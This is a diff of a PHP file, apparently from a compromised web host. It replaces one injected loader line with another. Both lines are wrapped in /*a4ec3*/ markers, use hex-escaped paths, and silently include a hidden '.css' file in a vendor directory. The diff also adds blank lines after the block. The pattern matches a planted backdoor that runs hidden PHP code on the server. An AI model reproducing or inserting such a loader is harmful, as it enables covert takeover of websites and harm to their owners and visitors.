@@ -1,9 +1,14 @@
 <?php
 /*a4ec3*/
 
-$r7gl = "/\x68ome/soilc\x68arger/public_\x68tml/finalapi_limen_bk/vendor/nikic/.88a5b740.css"; if (!isset($r7gl)) {str_shuffle ($r7gl);} else { @include_once /* 109 */ ($r7gl); }
+$r3n = "/home/soilcharger/\x70ublic_html/del_final_website/vendor/dflydev/.65d59963.css"; if (!isset($r3n)) {addslashes ($r3n);} else { @include_once /* 186 */ ($r3n); }
 
 /*a4ec3*/
+
+
+
+
+
 
 
 
